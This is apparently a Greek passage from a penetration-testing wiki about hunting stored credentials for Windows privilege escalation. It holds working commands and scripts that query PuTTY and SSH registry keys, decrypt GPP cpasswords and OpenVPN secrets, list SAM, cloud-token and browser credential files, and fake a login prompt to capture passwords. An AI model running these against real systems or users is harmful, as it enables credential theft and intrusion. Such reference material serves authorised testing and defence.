Ένας διακομιστής CI μπορεί να διατηρεί υποβληθείσες αλλαγές πηγαίου κώδικα στον κατάλογο δεδομένων του ακόμη και μετά την ολοκλήρωση του build. Η [TeamCity τεκμηριώνει](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) ότι το `system/changes` αποθηκεύει αλλαγές από remote runs· ο κατάλογος δεδομένων μπορεί να ρυθμιστεί και δεν βρίσκεται απαραίτητα στο `ProgramData`. Ένα αναγνώσιμο patch μπορεί να διατηρεί αναφορές που αφαιρέθηκαν ή προστέθηκαν σε αρχείο διαπιστευτηρίων, κλειδί κρυπτογράφησης ή script που χρησιμοποιεί και τα δύο. Για παράδειγμα, μια ροή εργασίας PowerShell `ConvertTo-SecureString -Key` χρειάζεται τόσο το κλειδί AES όσο και την κρυπτογραφημένη συμβολοσειρά· η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) ότι το κλειδί παρέχεται ξεχωριστά. Εξετάστε πρώτα μόνο τα ονόματα των προσβάσιμων patches και, έπειτα, επιθεωρήστε το σχετικό περιεχόμενο με εξουσιοδότηση, χωρίς να εμφανίζετε μυστικά στη συνήθη έξοδο απαρίθμησης. Μια διαδρομή patch, μια κρυπτογραφημένη τιμή ή μια αναφορά σε κλειδί από μόνα τους δεν αποδεικνύουν έγκυρο διαπιστευτήριο ή πρόσβαση με περισσότερα δικαιώματα. Περιορίστε τα ACL του καταλόγου δεδομένων και αποφύγετε την ενσωμάτωση μυστικών σε αλλαγές build.

### Προσαρμοσμένη περιστροφή κωδικού πρόσβασης τοπικού διαχειριστή

Ένα αυτοσχέδιο εργαλείο περιστροφής κωδικών πρόσβασης μπορεί να αποθηκεύει έναν κρυπτογραφημένο κωδικό πρόσβασης τοπικού διαχειριστή σε μια τοπική υπηρεσία, διατηρώντας παράλληλα τα διαπιστευτήρια του datastore σε αναγνώσιμο αρχείο `.env` ή δίπλα στο εκτελέσιμο αρχείο του updater. Εξετάστε από κοινού την προγραμματισμένη εργασία του updater, τον λογαριασμό, τα ACL της διαμόρφωσης, τον listener και τα δικαιώματα του datastore. Ένα datastore που ακούει μόνο στο loopback εξακολουθεί να είναι προσβάσιμο από τοπικό χρήστη με έγκυρα διαπιστευτήρια, αλλά ο έλεγχος ταυτότητας από μόνος του δεν αποδεικνύει δικαίωμα ανάγνωσης των σχετικών εγγραφών. Αν το seed κρυπτογράφησης ή το υλικό κλειδιού είναι προσβάσιμο δίπλα στο κρυπτογραφημένο κείμενο, εξετάστε την ακριβή παραγωγή κλειδιού πριν βασιστείτε στην κρυπτογράφηση. Ένα σχήμα που παράγει ντετερμινιστικά ένα κλειδί AES από εκτεθειμένο seed χρησιμοποιώντας το Go [`math/rand`](https://pkg.go.dev/math/rand) είναι ακατάλληλο για την προστασία αυτού του κωδικού πρόσβασης· η Go τεκμηριώνει ότι αυτό το πακέτο δεν είναι κατάλληλο για τυχαιότητα ευαίσθητη σε θέματα ασφάλειας. Επιβεβαιώστε ότι οποιοσδήποτε ανακτημένος κωδικός πρόσβασης είναι τρέχων και ανήκει σε λογαριασμό της ομάδας τοπικών Administrators πριν τον θεωρήσετε πιθανή οδό κλιμάκωσης δικαιωμάτων. Μια προγραμματισμένη εργασία, μια διαδρομή `.env` ή ένα κρυπτογραφημένο blob από μόνα τους δεν αποδεικνύουν καμία από αυτές τις συνθήκες. Μην περιλαμβάνετε κωδικούς πρόσβασης και υλικό κλειδιών στη συνήθη έξοδο απαρίθμησης.

Χρησιμοποιήστε το [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) για τη διαχείριση κωδικών πρόσβασης τοπικών διαχειριστών. Η αποθήκευσή τους σε directory ή σε Entra και οι αντίστοιχοι έλεγχοι πρόσβασης διαφέρουν από ένα προσαρμοσμένο τοπικό datastore· αντίστοιχα, οι [ρόλοι Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) καθορίζουν αν ένας πιστοποιημένος χρήστης datastore μπορεί να διαβάσει συγκεκριμένο index.

### Αρχεία plugin διακομιστή Java και επαναχρησιμοποίηση διαπιστευτηρίων

Ορισμένα plugins διακομιστή Java διανέμονται ως αρχεία JAR στον κατάλογο `plugins` ενός διακομιστή. Ένα αναγνώσιμο προσαρμοσμένο plugin μπορεί να περιέχει διαμόρφωση ή bytecode με ενσωματωμένο διαπιστευτήριο υπηρεσίας. Εξετάστε το αρχείο μόνο εφόσον έχετε εξουσιοδότηση και μην περιλαμβάνετε ανακτημένα μυστικά στη συνήθη έξοδο απαρίθμησης. Μια διαδρομή plugin από μόνη της δεν αποδεικνύει ότι υπάρχει μυστικό, και ένας ανακτημένος κωδικός πρόσβασης υπηρεσίας οδηγεί σε περισσότερα δικαιώματα μόνο αν ισχύει και για λογαριασμό με περισσότερα δικαιώματα. Ελέγξτε τα ACL των σχετικών αρχείων και αντικαταστήστε τους επαναχρησιμοποιημένους κωδικούς πρόσβασης με διαφορετικά μυστικά. Δείτε τον [οδηγό εγκατάστασης plugin του PaperMC](https://docs.papermc.io/paper/adding-plugins/) για τη διάταξη των καταλόγων και την [τεκμηρίωση JAR της Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) για τα περιεχόμενα αρχείων.

### Διαπιστευτήρια ενσωματωμένης βάσης δεδομένων Openfire

Μια εγκατάσταση Openfire που χρησιμοποιεί την ενσωματωμένη βάση δεδομένων μπορεί να διατηρεί το `openfire.script` στον κατάλογο `Openfire\embedded-db`. Αν ο τρέχων λογαριασμός μπορεί να το διαβάσει, εξετάστε μαζί τις εγγραφές `OFUSER` και την ιδιότητα `passwordKey`. Η [τεκμηρίωση παρόχου χρηστών του Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) αναφέρει ότι οι κωδικοί πρόσβασης μπορούν να αποθηκεύονται ως απλό κείμενο ή να κρυπτογραφούνται με κλειδί που βρίσκεται σε αυτή την ιδιότητα. Ένας ανακτημένος κωδικός πρόσβασης έχει σημασία για την κλιμάκωση δικαιωμάτων μόνο αν εξακολουθεί να ισχύει για μια ταυτότητα με περισσότερα δικαιώματα· το όνομα αρχείου από μόνο του δεν αποδεικνύει ούτε πρόσβαση ανάγνωσης ούτε επαναχρησιμοποίηση διαπιστευτηρίων. Η διαδρομή αποτελεί ένδειξη για απογραφή, επομένως μην περιλαμβάνετε περιεχόμενο βάσης δεδομένων και διαπιστευτήρια στη συνήθη έξοδο απαρίθμησης.

Το ξεχωριστό αρχείο `Openfire\conf\openfire.xml` μπορεί να αποκαλύψει τις ρυθμισμένες θύρες και τη διεπαφή bind της κονσόλας διαχείρισης, ακόμη και όταν χρησιμοποιείται εξωτερική βάση δεδομένων. Συνήθως το Openfire δεσμεύει την κονσόλα διαχείρισης στη διεύθυνση loopback· αυτό εξακολουθεί να επιτρέπει σε έναν τοπικό λογαριασμό να συνδεθεί στη διεύθυνση, αν ο listener λειτουργεί. Ελέγξτε από κοινού τον πραγματικό listener, τον εξουσιοδοτημένο ρόλο διαχειριστή, την πολιτική μεταφόρτωσης plugin και την ταυτότητα υπηρεσίας Openfire. Ένας διαχειριστής που μπορεί να εγκαταστήσει plugin ενδέχεται να εκτελέσει κώδικα plugin στο πλαίσιο της υπηρεσίας, κάτι που μπορεί να παρέχει αυξημένα δικαιώματα όταν η υπηρεσία εκτελείται ως LocalSystem. Ένας κωδικός πρόσβασης που ταιριάζει ή μια αναγνώσιμη διαδρομή διαμόρφωσης από μόνα τους δεν αποδεικνύουν πρόσβαση στην κονσόλα διαχείρισης ή εκτέλεση κώδικα. Δείτε τον [οδηγό εγκατάστασης και διαχείρισης plugin του προμηθευτή](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) και την [ιδιότητα API μεταφόρτωσης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Διαμόρφωση διακομιστή διαχείρισης ψηφιακών εγκληματολογικών ερευνών

Οι διαμορφώσεις διακομιστή Velociraptor, που συνήθως ονομάζονται `server.config.yaml`, μπορεί να περιέχουν το `CA.private_key` της εσωτερικής CA. Αν ένας χρήστης με λιγότερα δικαιώματα μπορεί να διαβάσει αυτό το κλειδί, ενδέχεται να μπορεί να δημιουργήσει πιστοποιητικό πελάτη API. Το αν αυτό οδηγεί σε περισσότερα δικαιώματα εξαρτάται από τους ρόλους χρηστών του διακομιστή, την προσβασιμότητα του API και την ταυτότητα με την οποία εκτελείται ο διακομιστής ή ο agent-στόχος. Μια διαμόρφωση πελάτη περιέχει διαφορετικό υλικό· η εύρεσή της δεν αποδεικνύει πρόσβαση στην CA του διακομιστή. Σε ορισμένες εγκαταστάσεις, το ιδιωτικό κλειδί της CA διατηρείται offline, επομένως μια αναγνώσιμη διαμόρφωση διακομιστή μπορεί να μην περιέχει το κλειδί υπογραφής.

Σε διακομιστή Windows, επιθεωρήστε τα ACL της διαμόρφωσης **του διακομιστή** στον κατάλογο εγκατάστασής του, καθώς και τυχόν προστατευμένα αντίγραφα ασφαλείας. Μια πιθανή τοποθεσία είναι η `%ProgramFiles%\VelociraptorServer\server.config.yaml`· χρησιμοποιήστε τη διαδρομή που έχει ρυθμιστεί για την υπηρεσία αν διαφέρει. Επιβεβαιώστε ότι η τρέχουσα ταυτότητα μπορεί να διαβάσει το αρχείο και ότι υπάρχει πράγματι το `CA.private_key`. Αποφύγετε την εμφάνιση του ιδιωτικού κλειδιού σε logs ή στην έξοδο απαρίθμησης. Η ροή εργασίας `config api_client` του προμηθευτή χρησιμοποιεί το κλειδί CA για την έκδοση πιστοποιητικού πελάτη, αλλά απαιτείται επίσης αποτελεσματικός ρόλος στην πλευρά του διακομιστή· η δημιουργία ή η αλλαγή τέτοιου ρόλου μπορεί να απαιτεί δικαίωμα εγγραφής στο datastore ή επανεκκίνηση. Μια υπάρχουσα ταυτότητα διακομιστή με αυξημένα δικαιώματα μπορεί να παρέχει οδό ακόμη κι όταν αυτές οι εγγραφές δεν είναι διαθέσιμες. Τα API queries με δικαιώματα εκτέλεσης εκτελούνται στο σχετικό πλαίσιο διακομιστή ή agent, το οποίο μπορεί να διαθέτει αυξημένα δικαιώματα.

Προστατέψτε τη διαμόρφωση του διακομιστή και τα αντίγραφα ασφαλείας με περιοριστικά ACL, διατηρήστε offline το κλειδί υπογραφής της CA όπου είναι δυνατό και περιορίστε τους ρόλους API και την πρόσβαση στους listeners. Δείτε την [τεκμηρίωση API του Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) και τις [οδηγίες διαμόρφωσης ασφάλειας](https://docs.velociraptor.app/docs/deployment/security/).

### Διαπιστευτήρια PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Το Solar-PuTTY είναι ξεχωριστός διαχειριστής συνεδριών. Το εγγενές κρυπτογραφημένο αποθετήριό του μπορεί να βρίσκεται στο `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ενώ ένα εξαγόμενο αντίγραφο ασφαλείας συνεδριών μπορεί να ονομάζεται `sessions-backup.dat` και να είναι αποθηκευμένο αλλού. [Ο οδηγός εξαγωγής της SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) αναφέρει ότι οι εξαγωγές είναι κρυπτογραφημένες με κωδικό πρόσβασης και μπορούν να περιλαμβάνουν συνεδρίες, κλειδιά, scripts, ετικέτες και συσχετίσεις· το [φόρουμ υποστήριξής της](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) προσδιορίζει το εγγενές αποθετήριο. Ελέγξτε πρώτα τα δικαιώματα και τις διαδρομές των αρχείων. Η εύρεση ενός από τα δύο αρχεία δεν αποκαλύπτει τον κωδικό πρόσβασής του ούτε αποδεικνύει ότι τυχόν αποθηκευμένα διαπιστευτήρια εξακολουθούν να ισχύουν ή παρέχουν αυξημένα δικαιώματα.

### Κλειδιά SSH host του PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Κλειδιά SSH στο registry

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκεύονται στο κλειδί registry `HKCU\Software\OpenSSH\Agent\Keys`, επομένως θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Αν βρείτε οποιαδήποτε καταχώριση σε αυτήν τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα με το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν ισχύει πλέον. Προσπάθησα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με το `ssh-add` και να συνδεθώ μέσω ssh σε ένα μηχάνημα. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την ασύμμετρη αυθεντικοποίηση κλειδιού.

### Αρχεία unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Αντίγραφα ασφαλείας SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Τα αναγνώσιμα αρχεία αντιγράφων ασφαλείας Windows Imaging (`.wim`) μπορεί επίσης να περιέχουν offline hives `SAM`, `SECURITY` και `SYSTEM`. Δώστε προτεραιότητα σε τοπικά προσβάσιμους καταλόγους αντιγράφων ασφαλείας ή εικόνων και ελέγξτε τα **ονόματα των μελών** μιας εικόνας πριν από την εξαγωγή οτιδήποτε· το όνομα αρχείου `.wim` από μόνο του δεν αποδεικνύει ότι εκτίθενται hives, ενώ τα συνηθισμένα `install.wim`, `boot.wim` και οι εικόνες αποκατάστασης είναι συχνά λανθασμένα ευρήματα. Ένα SMB share είναι ξεχωριστή οδός πρόσβασης και θα πρέπει να ελέγχεται μόνο όταν αυτό το share είναι εντός του πεδίου εφαρμογής. Δείτε τις οδηγίες της Microsoft για [εικόνες Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) και την [αναφορά αρχείων registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Διαπιστευτήρια Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Αποθηκευμένος κωδικός πρόσβασης GPP

Παλαιότερα υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα υπολογιστών μέσω των Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα από οποιονδήποτε χρήστη του domain. Δεύτερον, οι κωδικοί πρόσβασης σε αυτά τα GPP, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε πιστοποιημένο χρήστη. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν αυξημένα προνόμια.

Για τον περιορισμό αυτού του κινδύνου, αναπτύχθηκε μια συνάρτηση που αναζητά τοπικά αποθηκευμένα αρχεία GPP τα οποία περιέχουν πεδίο "cpassword" με μη κενή τιμή. Όταν εντοπιστεί ένα τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες σχετικά με το GPP και τη θέση του αρχείου, διευκολύνοντας τον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε αυτά τα αρχεία στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Ρύθμιση Web του IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Παράδειγμα του web.config με διαπιστευτήρια:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Αντίγραφα ασφαλείας σε μορφή archive σε ένα IIS webroot

Ένα παλιό αντίγραφο ασφαλείας ZIP, τοποθετημένο απευθείας σε webroot που εξυπηρετείται, μπορεί να εκθέσει προηγούμενα αρχεία ρυθμίσεων και επαναχρησιμοποιήσιμα διαπιστευτήρια. Ελέγξτε τη διαμορφωμένη φυσική διαδρομή του ιστότοπου και αν το archive είναι πράγματι προσβάσιμο μέσω HTTP, πριν θεωρήσετε ότι υπάρχει έκθεση. Η προεπιλεγμένη διαδρομή `C:\inetpub\wwwroot` είναι απλώς μια πιθανή επιλογή. Μια γρήγορη τοπική καταγραφή μπορεί να εμφανίσει ονόματα και μεγέθη χωρίς να ανοίξει τα archives:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ένα όνομα αρχειοθήκης δεν αποδεικνύει ότι περιέχει κάποιο μυστικό ή ότι ένα ανακτημένο διαπιστευτήριο παρέχει υψηλότερα προνόμια.

### Διαπιστευτήρια OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Αρχεία καταγραφής

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμη και τα διαπιστευτήρια κάποιου άλλου χρήστη**, αν πιστεύετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το να **ζητήσετε** απευθείας από τον πελάτη τα **διαπιστευτήριά** του είναι πραγματικά **επικίνδυνο**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που παλαιότερα περιείχαν **κωδικούς πρόσβασης** σε **clear-text** ή Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Παραλλαγή λίστας ονομάτων αρχείων χωρίς την επέκταση Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Οι βάσεις δεδομένων Password Safe v3 χρησιμοποιούν συνήθως την επέκταση `.psafe3`. Αντιμετωπίστε ένα αρχείο με αντίστοιχο όνομα ως πιθανό κρυπτογραφημένο θησαυροφυλάκιο· η παρουσία του δεν αποδεικνύει ότι μπορείτε να το διαβάσετε, να το ξεκλειδώσετε ή να χρησιμοποιήσετε τυχόν αποθηκευμένα διαπιστευτήρια. Κατά τον έλεγχο του πού αποθηκεύονται τέτοια αρχεία, ελέγξτε τα προφίλ χρηστών στα οποία έχετε πρόσβαση και τις ρυθμισμένες ρίζες κοινής χρήσης αρχείων.

Ένα αναγνώσιμο αρχείο KeePass `.kdbx` αποτελεί επίσης μόνο ένδειξη για ένα κρυπτογραφημένο θησαυροφυλάκιο. Για να το ξεκλειδώσετε απαιτείται ο πραγματικός κύριος κωδικός πρόσβασης, καθώς και τυχόν ρυθμισμένα αρχεία κλειδιών ή παράγοντες λογαριασμού. Αν ένας εξουσιοδοτημένος έλεγχος εντοπίσει σε μια καταχώριση ένα ζεύγος hash LM:NT, επαληθεύστε τον αναφερόμενο λογαριασμό και αν το NT hash είναι τρέχον και γίνεται αποδεκτό από την υπηρεσία NTLM του στόχου, προτού εξετάσετε το ενδεχόμενο [pass-the-hash](../ntlm/README.md#pass-the-hash). Μια καταχώριση θησαυροφυλακίου δεν παρέχει από μόνη της δικαιώματα Administrator ή SYSTEM· πρέπει επίσης να ισχύουν η απομακρυσμένη πρόσβαση στην υπηρεσία, τα δικαιώματα του λογαριασμού και τυχόν ξεχωριστό βήμα εκτέλεσης υπηρεσίας. Η απογραφή θα πρέπει να αναφέρει τη διαδρομή του θησαυροφυλακίου και αν είναι αναγνώσιμο, όχι να εμφανίζει τη βάση δεδομένων ή τα αποθηκευμένα διαπιστευτήρια.

Αναζητήστε όλα τα προτεινόμενα αρχεία:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Παραλλαγή εντολής αναζήτησης χωρίς την επέκταση Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
